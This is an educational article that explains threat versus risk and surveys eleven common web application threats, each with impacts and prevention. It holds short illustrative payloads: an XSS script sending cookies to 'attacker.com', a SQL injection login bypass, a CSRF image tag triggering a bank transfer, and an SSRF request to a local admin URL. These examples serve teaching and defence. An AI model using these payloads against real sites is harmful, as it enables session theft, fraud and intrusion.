Web applications have become essential in nearly every industry — from banking to education, social networking, e-commerce, and government services. However, their **exposure to the public internet**, frequent use of third-party components, and handling of **valuable data** make them prime targets for attackers.

As such, understanding the **types of threats** they face and how to **evaluate the risks** is crucial for building and maintaining secure applications.

---

##  Threat vs. Risk – What’s the Difference?

###  What is a Threat?

A **threat** is any potential source of **harm** to a system. It’s an event or condition that can cause damage by exploiting a weakness (vulnerability).

* It **does not need to happen** — it's just a **possibility**.
* It can be **intentional** (e.g., hackers, malware), **accidental** (e.g., user error), or **natural** (e.g., power outages or floods).

#### Examples of Threats:

* A hacker attempting to exploit a SQL injection vulnerability
* Malware infecting a web server
* An employee misconfiguring the web app's permissions
* A sudden power failure that causes system downtime

---

### What is a Risk?

A **risk** is the **chance** that a threat will actually occur and cause **harm**.

> **Risk = Likelihood × Impact**

* **Likelihood**: How likely is it that this threat will happen?
* **Impact**: If it happens, how bad would it be?

#### Example:

* **Threat**: SQL Injection vulnerability exists in a login form.
* **Risk**: High likelihood of exploitation, with high impact (attackers can dump user credentials).

---

##  Summary:

| Term       | Meaning                                                 |
| ---------- | ------------------------------------------------------- |
| **Threat** | A potential cause of harm                               |
| **Risk**   | The chance and consequence of that threat becoming real |

A **threat** may exist even if it poses **no immediate risk** — for example, if effective controls are already in place to prevent it.

---

#  Common Web Application Threats & Risks 

Now let’s look at the **most prevalent threats** that web applications face today. Each one includes:

* What it is
* How it works
* Why it’s dangerous
* Real-world examples
* How to prevent it

---

### 1. **Cross-Site Scripting (XSS)**

**What it is:**
XSS occurs when an attacker is able to inject **malicious JavaScript** or other code into pages viewed by other users.

**Types:**

* **Stored XSS**: Script is permanently stored on the server (e.g., in comments)
* **Reflected XSS**: Script is reflected in an immediate response (e.g., error message or search result)
* **DOM-Based XSS**: Occurs entirely on the client-side via JavaScript manipulation

**Impacts:**

* Session hijacking
* Cookie theft
* Redirecting users to malicious websites
* Logging keystrokes or stealing form input

**Real Example:**
An attacker posts a comment like `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` and steals session cookies.

**Prevention:**

* Sanitize and encode all user input/output
* Use security libraries like DOMPurify
* Implement Content Security Policy (CSP)

---

### 2. **SQL Injection (SQLi)**

**What it is:**
SQLi happens when user input is improperly handled and **injected into a SQL query**, allowing the attacker to manipulate database operations.

**Impacts:**

* View or dump entire databases
* Delete or corrupt data
* Bypass login mechanisms
* Escalate privileges

**Example:**

```sql
SELECT * FROM users WHERE username = '$input';
```

If `$input = 'admin' --`, it bypasses authentication.

**Real Breach:**
The 2009 Heartland Payment Systems breach, which exposed over 100 million credit cards, started with a SQL injection.

**Prevention:**

* Use prepared statements (parameterized queries)
* Avoid dynamic SQL
* Perform input validation

---

### 3. **Cross-Site Request Forgery (CSRF)**

**What it is:**
In CSRF, an attacker tricks a logged-in user into performing an **unintended action** on a web app, like changing a password or making a purchase.

**Example:**
A user is logged in to their bank, and visits a malicious page with:

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

**Impacts:**

* Unauthorized transactions
* Email/password changes
* Exploitation of admin panels

**Prevention:**

* Use anti-CSRF tokens
* Verify the request origin (Referer/Origin headers)
* Avoid GET for state-changing actions

---

### 4. **Security Misconfiguration**

**What it is:**
This occurs when applications, servers, or frameworks are not properly secured.

**Examples:**

* Default credentials (e.g., `admin:admin`)
* Directory listing enabled
* Unpatched systems
* Verbose error messages revealing stack traces

**Impacts:**

* Unauthorized access
* Data leakage
* Easier exploitation by attackers

**Prevention:**

* Harden server configurations
* Use automated tools (like Lynis or Nikto)
* Perform regular configuration audits

---

### 5. **Sensitive Data Exposure**

**What it is:**
Sensitive data like passwords, credit cards, or personal info is not adequately protected during storage or transmission.

**Examples:**

* Passwords stored in plaintext
* Insecure HTTP instead of HTTPS
* Exposing sensitive data in URLs

**Impacts:**

* Identity theft
* Account takeover
* Legal penalties (e.g., GDPR fines)

**Prevention:**

* Encrypt data at rest and in transit
* Use HTTPS with strong TLS
* Don’t log sensitive data

---

### 6. **Brute-Force and Credential Stuffing**

**What it is:**
Attackers use bots to guess credentials, either by:

* Trying many combinations (brute-force), or
* Using leaked credentials from other breaches (credential stuffing)

**Impacts:**

* Account takeover
* Unauthorized access
* Credential reuse risks across platforms

**Prevention:**

* Implement rate limiting
* Use CAPTCHA
* Enforce strong password policies
* Monitor for unusual login patterns

---

### 7. **File Upload Vulnerabilities**

**What it is:**
Insecure file upload features can allow users to upload malicious files.

**Impacts:**

* Remote Code Execution
* Server-side malware execution
* Storage exhaustion

**Prevention:**

* Restrict allowed file types
* Scan files after upload
* Store files outside web root
* Rename uploaded files randomly

---

### 8. **Denial-of-Service (DoS) / Distributed DoS (DDoS)**

**What it is:**
Attackers flood a server with traffic or resource-heavy requests, rendering it **unusable** for real users.

**Impacts:**

* Application downtime
* Revenue loss
* Service unavailability

**Prevention:**

* Rate limiting
* Web Application Firewalls (WAFs)
* Cloud-based DDoS protection (e.g., Cloudflare, AWS Shield)

---

### 9. **Server-Side Request Forgery (SSRF)**

**What it is:**
An attacker tricks a vulnerable server into **making HTTP requests** to other systems (internal or external).

**Impacts:**

* Internal port scanning
* Accessing metadata services (e.g., AWS EC2 instance info)
* Bypassing firewalls

**Example:**
A PDF converter feature allows user-supplied URLs. An attacker supplies `http://127.0.0.1/admin` and accesses internal apps.

**Prevention:**

* Block internal IP ranges
* Whitelist allowed domains
* Don’t fetch URLs from user input

---

### 10. **Inadequate Access Controls / Broken Access Control**

**What it is:**
Users are able to access **resources or actions they shouldn't** due to poor or missing authorization checks.

**Examples:**

* Regular users accessing admin panels
* Viewing other users’ profiles or documents
* Modifying data using direct object references (e.g., changing `user_id=2` to `user_id=3`)

**Impacts:**

* Data exposure
* Unauthorized actions
* Regulatory violations

**Prevention:**

* Enforce access controls at the server level
* Use secure ID references (not predictable)
* Test all roles and privilege boundaries

---

### 11. **Using Components with Known Vulnerabilities**

**What it is:**
Web apps often rely on third-party packages. If these contain **known flaws**, attackers can exploit them.

**Examples:**

* Old versions of jQuery
* Outdated CMS plugins
* Unpatched libraries

**Impacts:**

* Full application compromise
* Remote code execution
* Exploiting via supply chain

**Prevention:**

* Use dependency scanning tools (e.g., Snyk, Dependabot)
* Keep components updated
* Remove unused plugins and libraries

---

##  Defense-in-Depth

To effectively protect against these threats, you should apply **layered security controls**, including:

* Secure coding and input validation
* Authentication & session protection
* Access control enforcement
* Regular vulnerability scanning & pentesting
* Secure configuration
* Monitoring and logging
* Keeping dependencies up to date

